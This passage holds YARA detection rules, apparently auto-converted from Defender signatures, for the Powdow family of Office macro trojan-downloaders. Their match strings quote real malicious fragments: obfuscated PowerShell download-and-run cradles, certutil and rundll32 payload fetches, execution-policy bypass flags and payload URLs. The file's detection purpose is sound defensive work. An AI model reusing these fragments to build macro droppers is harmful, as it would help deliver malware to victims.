        $x_1_3 = "Invoke\"('https://tinyurl.com/yxdya7j6','pd.bat')" ascii //weight: 1
        $x_1_4 = "Invoke\"\"('https://tinyurl.com/y23pv4qt','pd.bat')\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule TrojanDownloader_O97M_Powdow_PDB_2147768670_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.PDB!MTB"
        threat_id = "2147768670"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "cgBpACAAIgBoAHQAdABwADoALwAvADUALgAxADgAMQAucACADgAMAAuADEAMgA5AC8AaQBtAGEAZwBlAHMALwBhAG4AdAcACBpAHAAbABhAG4AZQAuAHAAbgBnACIAIAAtAE8AdQB0AEYAaQBsAGUAIAcACAiAEMAOgB" ascii //weight: 1
        $x_1_2 = "& start /B cACCcAC:cAC\\PcACrocACgrcACamcACDcACatcACa\\dfcACle.bcACacACt" ascii //weight: 1
        $x_1_3 = "wer = Shell(wkjh, 0)" ascii //weight: 1
        $x_1_4 = "rhqwoelhsld = Replace(jlvfd, bxcj, \"\")" ascii //weight: 1
        $x_1_5 = "fojn = ertjwlkfj(0, \"\", \"\", 0, 0)" ascii //weight: 1
        $x_1_6 = "MsgBox \"q34\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_SHL_2147768671_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.SHL!MTB"
        threat_id = "2147768671"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "8"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Private Function sas()" ascii //weight: 1
        $x_1_2 = "'shell HGJHG" ascii //weight: 1
        $x_1_3 = "HGJHG = itwillx(" ascii //weight: 1
        $x_1_4 = "c = Asc(Mid$(joe, i, 1))" ascii //weight: 1
        $x_1_5 = "c = c - Asc(Mid$(xw, (i Mod Len(xw)) + 1, 1))" ascii //weight: 1
        $x_1_6 = "strBuff = strBuff & Chr(c And &HFF)" ascii //weight: 1
        $x_1_7 = "strBuff = joe" ascii //weight: 1
        $x_1_8 = {22 4b 4b 22 29 02 00 48 47 4a 48 47 20 3d 20 48 47 4a 48 47 20 2b 20 69 74 77 69 6c 6c 78 28 22}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_PE_2147769090_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.PE!MTB"
        threat_id = "2147769090"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "CHAR(112)&CHAR(111)&\"wer^she\"&CHAR(108)&CHAR(108)" ascii //weight: 1
        $x_1_2 = "stARt`-slE`Ep 25" ascii //weight: 1
        $x_1_3 = "cd ${enV`:appdata}" ascii //weight: 1
        $x_1_4 = "('.'+'/zn\"&CHAR(46)&\"exe" ascii //weight: 1
        $x_1_5 = "c\"&CHAR(109)&CHAR(100)&CHAR(32)&CHAR(47)&CHAR(99)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_PE_2147769090_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.PE!MTB"
        threat_id = "2147769090"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "ping_xx + ping_xx1r2" ascii //weight: 1
        $x_1_2 = "calcmotor.Show" ascii //weight: 1
        $x_1_3 = "Shell calcsexkookk" ascii //weight: 1
        $x_1_4 = "\"tp://%748237%728748%728748%728748%728748%728748@j.mp/\"" ascii //weight: 1
        $x_1_5 = "nabdbasjkdtyiasdbmna" ascii //weight: 1
        $x_1_6 = "dhsasbdasghdtjgashvch" ascii //weight: 1
        $x_1_7 = "k9_42_as = \"t\" + \"a ht\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (6 of ($x*))
}

rule TrojanDownloader_O97M_Powdow_PER_2147769474_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.PER!MTB"
        threat_id = "2147769474"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "h%^t%^t%^p%^:%^/%^/%^l%^i%^m%^i%^t%^e%^d%^e%^d%^i%^t%^i%^o%^n%^p%^h%^o%^t%^o%^s%^.%^n%^l%^/%^w%^p%^-%^i%^n%^c%^l%^u%^d%^e%^s%^/%^I%^D%^3%^/%^z%^z%^z%^.%^t%^x%^t%^" ascii //weight: 1
        $x_1_2 = "tt = Replace(tt, \"%^\", \"\")" ascii //weight: 1
        $x_1_3 = "cc = String(1, \"P~WQ787H1JMXYHZ7FS1G13J0TMQ6XR4Z\")" ascii //weight: 1
        $x_1_4 = "ShellObj.ShellExecute cc, tt" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_NWT_2147769851_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.NWT!MTB"
        threat_id = "2147769851"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "9"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Sub auto_open()" ascii //weight: 1
        $x_1_2 = "Dim strMacro As String" ascii //weight: 1
        $x_1_3 = "aya1 = \"=\" + Chr(69) + \"X\"" ascii //weight: 1
        $x_1_4 = "aya2 = Chr(69) + Chr(67)" ascii //weight: 1
        $x_1_5 = "Sheets(\"Macro1\").Range(\"D122\").Name = \"ok\"" ascii //weight: 1
        $x_1_6 = "Sheets(\"Macro1\").Range(\"D130\") = aya1 + aya2 + \"(\" + Sheets(\"Macro1\").Range(\"D135\").Value" ascii //weight: 1
        $x_1_7 = "strMacro = \"ok\"" ascii //weight: 1
        $x_1_8 = "Run (strMacro)" ascii //weight: 1
        $x_1_9 = "Set ExcelSheet = Nothing" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_TTY_2147769952_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.TTY!MTB"
        threat_id = "2147769952"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "(nEw-oB`jecT Net.WebcL`IENt)" ascii //weight: 1
        $x_1_2 = "('Down'+'loadFile')" ascii //weight: 1
        $x_1_3 = "\"Invoke\"('https://cutt.ly/ghcgRqa','pd" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_TTZ_2147770158_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.TTZ!MTB"
        threat_id = "2147770158"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "(nEw-oB`jecT Net.WebcL`IENt)" ascii //weight: 1
        $x_1_2 = "('Down'+'loadFile')" ascii //weight: 1
        $x_1_3 = "\"Invoke\"('https://cutt.ly/vhm9KWX','pd" ascii //weight: 1
        $x_1_4 = "\"Invoke\"('https://cutt.ly/NhQu97I','pd" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule TrojanDownloader_O97M_Powdow_PD_2147770185_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.PD!MTB"
        threat_id = "2147770185"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "EXEC(\"C:\\\"&CHAR(80)&CHAR(82)&\"OGRAMDATA\\a.\"&CHAR(101)&\"xe\")" ascii //weight: 1
        $x_1_2 = "ur\"&CHAR(108)&\"mon" ascii //weight: 1
        $x_1_3 = "JJCCJJ" ascii //weight: 1
        $x_1_4 = "CHAR(104)&\"ttp://cutt.ly/uhnsGVK" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_PD_2147770185_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.PD!MTB"
        threat_id = "2147770185"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= Shell(\"cmd /c certutil.exe -urlcache -split -f \"\"https://random1.x24hr.com/k/Olusvpn.exe\"" ascii //weight: 1
        $x_1_2 = {2e 65 78 65 2e 65 78 65 20 26 26 20 [0-31] 2e 65 78 65 2e 65 78 65 22 2c 20 76 62 48 69 64 65 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_CUT_2147770344_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.CUT!MTB"
        threat_id = "2147770344"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "8"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Sub auto_open()" ascii //weight: 1
        $x_1_2 = "pd = \"X\"" ascii //weight: 1
        $x_1_3 = "oyo1 = \"=E\" + pd" ascii //weight: 1
        $x_1_4 = "oyo2 = Chr(69) + Chr(67)" ascii //weight: 1
        $x_1_5 = "Sheets(\"Macro1\").Range(\"D121\").Name = \"fdp\"" ascii //weight: 1
        $x_1_6 = "Sheets(\"Macro1\").Range(\"D130\") = oyo1 + oyo2 + \"(\" + Sheets(\"Macro1\").Range(\"D135\").Value" ascii //weight: 1
        $x_1_7 = "strMacro = \"fdp\"" ascii //weight: 1
        $x_1_8 = "Run (strMacro)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_CLY_2147770345_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.CLY!MTB"
        threat_id = "2147770345"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "(nEw-oB`jecT Net.WebcL`IENt)" ascii //weight: 1
        $x_1_2 = "('Down'+'loadFile')" ascii //weight: 1
        $x_1_3 = "ttps://cutt.ly/uhRomRh" ascii //weight: 1
        $x_1_4 = "stARt`-slE`Ep" ascii //weight: 1
        $x_1_5 = "&CHAR(46)&\"exe" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_PG_2147770378_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.PG!MTB"
        threat_id = "2147770378"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "c\"&CHAR(109)&CHAR(100)&CHAR(32)&CHAR(47)&CHAR(99)&CHAR(32)&" ascii //weight: 1
        $x_1_2 = "CHAR(112)&CHAR(111)&\"wer^she\"&CHAR(108)&CHAR(108)&CHAR(32)" ascii //weight: 1
        $x_1_3 = "-w 1 -EP bypass stARt`-slE`Ep 25" ascii //weight: 1
        $x_1_4 = "cd ${enV`:temp}" ascii //weight: 1
        $x_1_5 = "('.'+'/ii\"&CHAR(46)&\"exe')" ascii //weight: 1
        $x_1_6 = "ttps://tinyurl.com/y6m5spjf" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_PH_2147770379_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.PH!MTB"
        threat_id = "2147770379"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "11"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "c\"&CHAR(109)&CHAR(100)&CHAR(32)&CHAR(47)&CHAR(99)&CHAR(32)&" ascii //weight: 1
        $x_1_2 = "CHAR(112)&CHAR(111)&\"wer^she\"&CHAR(108)&CHAR(108)&CHAR(32)" ascii //weight: 1
        $x_1_3 = "-w 1 -EP bypass stARt`-slE`Ep 25" ascii //weight: 1
        $x_1_4 = "cd ${enV`:appdata}" ascii //weight: 1
        $x_1_5 = {28 27 2e 27 2b 27 2f ?? ?? 22 26 43 48 41 52 28 34 36 29 26 22 65 78 65 27 29}  //weight: 1, accuracy: Low
        $x_1_6 = "dont test me" ascii //weight: 1
        $x_1_7 = "aaaaaaalalalaa" ascii //weight: 1
        $x_1_8 = "useless cell" ascii //weight: 1
        $x_1_9 = "magic cell" ascii //weight: 1
        $x_1_10 = "epic cell" ascii //weight: 1
        $x_1_11 = "okokoko" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_TTF_2147770419_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.TTF!MTB"
        threat_id = "2147770419"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "(nEw-oB`jecT Net.WebcL`IENt)" ascii //weight: 1
        $x_1_2 = "('Down'+'loadFile')" ascii //weight: 1
        $x_1_3 = "ttps://cutt.ly/ZhYoHSL" ascii //weight: 1
        $x_1_4 = "${enV`:appdata}" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_ART_2147771159_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.ART!MTB"
        threat_id = "2147771159"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "(nEw-oB`jecT Net.WebcL`IENt)" ascii //weight: 1
        $x_1_2 = "+'loadFile')" ascii //weight: 1
        $x_1_3 = "ttps://tinyurl.com/y6fpv3lj" ascii //weight: 1
        $x_1_4 = "-Destination \"${enV`:temp}" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_CZZ_2147771176_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.CZZ!MTB"
        threat_id = "2147771176"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "(nEw-oB`jecT Net.WebcL`IENt)" ascii //weight: 1
        $x_1_2 = "+'loadFile')" ascii //weight: 1
        $x_1_3 = "ttps://cutt.ly/ZhAMLAA" ascii //weight: 1
        $x_1_4 = "stARt`-slE`Ep" ascii //weight: 1
        $x_1_5 = "&CHAR(46)&\"exe" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_BKD_2147771267_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.BKD!MTB"
        threat_id = "2147771267"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "(nEw-oB`jecT Net.WebcL`IENt)" ascii //weight: 1
        $x_1_2 = "'loadFile')" ascii //weight: 1
        $x_1_3 = "ttps://tinyurl.com/ybhxvxgd" ascii //weight: 1
        $x_1_4 = "'+'/tc\"&CHAR(46)&\"scr')" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_BKD_2147771267_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.BKD!MTB"
        threat_id = "2147771267"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "(nEw-oB`jecT Net.WebcL`IENt)" ascii //weight: 1
        $x_1_2 = "'loadFile')" ascii //weight: 1
        $x_1_3 = {27 2b 27 2f ?? ?? 22 26 43 48 41 52 28 34 36 29 26 22 65 78 65 27 29}  //weight: 1, accuracy: Low
        $x_1_4 = "ttps://cutt.ly/FhDv631" ascii //weight: 1
        $x_1_5 = "ttps://tinyurl.com/yapo8pxs" ascii //weight: 1
        $x_1_6 = "ttps://tinyurl.com/y8bcyly" ascii //weight: 1
        $x_1_7 = "ttps://tinyurl.com/ybj5pmnf" ascii //weight: 1
        $x_1_8 = "ttps://tinyurl.com/y9u7w4jj" ascii //weight: 1
        $x_1_9 = "ttps://cutt.ly/fhAmjL3" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule TrojanDownloader_O97M_Powdow_FDP_2147771298_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.FDP!MTB"
        threat_id = "2147771298"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "ArrayListbox.Open \"GET\", \"http://\" & ListBox1.List(3), False" ascii //weight: 1
        $x_1_2 = "VbStorage.SaveToFile (\"C:\\users\\public\\fdpc.dat\")" ascii //weight: 1
        $x_1_3 = "CreateObject(ListBox1.List(4)).Run (OptionSwapDatabase + \"C:\\users\\public\\fdpc.dat\") & \",DllUnregisterServer\"" ascii //weight: 1
        $x_1_4 = "ListBox1.AddItem (\"rundll32 \")" ascii //weight: 1
        $x_1_5 = "ListBox1.AddItem (\"gade4senate.com/m.dll\")" ascii //weight: 1
        $x_1_6 = "ListBox1.AddItem (\"WScript.Shell\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_BKE_2147771347_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.BKE!MTB"
        threat_id = "2147771347"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "bypass stARt`-slE`Ep 25" ascii //weight: 1
        $x_1_2 = "'loadFile')" ascii //weight: 1
        $x_1_3 = {27 2b 27 2f ?? ?? 22 26 43 48 41 52 28 34 36 29 26 22 65 78 65 27 29}  //weight: 1, accuracy: Low
        $x_1_4 = "ttps://tinyurl.com/yapf7lfr" ascii //weight: 1
        $x_1_5 = "ttps://cutt.ly/1hAnxyy" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule TrojanDownloader_O97M_Powdow_PK_2147771366_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.PK!MTB"
        threat_id = "2147771366"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "12"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {74 74 70 73 3a 2f 2f 74 69 6e 79 75 72 6c 2e 63 6f 6d 2f [0-10] 27 2c 27}  //weight: 1, accuracy: Low
        $x_1_2 = "-w 1 (nEw-oB`jecT Net" ascii //weight: 1
        $x_1_3 = "WebcL`IENt)" ascii //weight: 1
        $x_1_4 = "n'+'loadFile')" ascii //weight: 1
        $x_1_5 = "-w 1 -EP bypass stARt`-slE`Ep 25;" ascii //weight: 1
        $x_1_6 = "cd ${enV`:appdata};" ascii //weight: 1
        $x_1_7 = "EXEC(CHAR(112)&CHAR(111)&CHAR(119)&CHAR(101)&CHAR(114)&CHAR(115)&CHAR(104)&CHAR(101)&CHAR(108)&CHAR(108)&" ascii //weight: 1
        $x_1_8 = "dadadadafafafafa" ascii //weight: 1
        $x_1_9 = "useless cell" ascii //weight: 1
        $x_1_10 = "magic cell" ascii //weight: 1
        $x_1_11 = "epic cell" ascii //weight: 1
        $x_1_12 = {28 27 2e 27 2b 27 2f ?? ?? 22 26 43 48 41 52 28 34 36 29 26 22 65 78 65 27 29 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_PL_2147771419_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.PL!MTB"
        threat_id = "2147771419"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "10"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {74 74 70 73 3a 2f 2f 74 69 6e 79 75 72 6c 2e 63 6f 6d 2f [0-10] 27 2c 27}  //weight: 1, accuracy: Low
        $x_1_2 = "-w 1 (nEw-oB`jecT Net" ascii //weight: 1
        $x_1_3 = "WebcL`IENt)" ascii //weight: 1
        $x_1_4 = "n'+'loadFile')" ascii //weight: 1
        $x_1_5 = "-w 1 -EP bypass stARt`-slE`Ep 25;" ascii //weight: 1
        $x_1_6 = "cd ${enV`:appdata};" ascii //weight: 1
        $x_1_7 = "dadadadafafafafa" ascii //weight: 1
        $x_1_8 = "useless cell" ascii //weight: 1
        $x_1_9 = "magic cell" ascii //weight: 1
        $x_1_10 = "epic cell" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RSJ_2147771458_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RSJ!MTB"
        threat_id = "2147771458"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "powershell -nop -sta -ep bypass -noni -w hidden -enc cwBhAGwAIABxAHcAZQByAHQAeQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAOwBBAGQAZAAtAFQAeQBwAGUAIAAtAEEAIABTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcAOwAkAHcAZQBrAHIAbQA9AHEAdwBlAHIAdAB5ACAAUwB5AHMAdABlAG0ALgBEAHIAYQB" ascii //weight: 1
        $x_1_2 = "3AGkAbgBnAC4AQgBpAHQAbQBhAHAAKAAoAHEAdwBlAHIAdAB5ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ATwBwAGUAbgBSAGUAYQBkACgAIgBoAHQAdABwAHMAOgAvAC8AaQAuAGkAbQBnAHUAcgAuAGMAbwBtAC8AZwA0AEEAUwByAE0AMgAuAHAAbgBnACIAKQAp" ascii //weight: 1
        $x_1_3 = "MsgBox \"This document is password protected!\"" ascii //weight: 1
        $x_1_4 = "Shell = CreateObject(\"WScript.Shell\")" ascii //weight: 1
        $x_1_5 = "Shell.Run (cmd)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_MAS_2147771482_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.MAS!MTB"
        threat_id = "2147771482"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "10"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "dadadadafafafafa" ascii //weight: 1
        $x_1_2 = "magic cell" ascii //weight: 1
        $x_1_3 = "=EXEC(CHAR(112)&CHAR(111)&CHAR(119)&CHAR(101)&CHAR(114)&CHAR(115)&CHAR(104)&CHAR(101)&CHAR(108)&CHAR(108)" ascii //weight: 1
        $x_1_4 = "EP bypass stARt`-slE`Ep" ascii //weight: 1
        $x_1_5 = "cd ${enV`:appdata}" ascii //weight: 1
        $x_1_6 = "&CHAR(46)&\"exe')" ascii //weight: 1
        $x_1_7 = "(nEw-oB`jecT Net.WebcL`IENt)" ascii //weight: 1
        $x_1_8 = "+'loadFile')" ascii //weight: 1
        $x_1_9 = "stARt`-slE`Ep" ascii //weight: 1
        $x_1_10 = "ttp://bohler-edelstahl-at.com" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

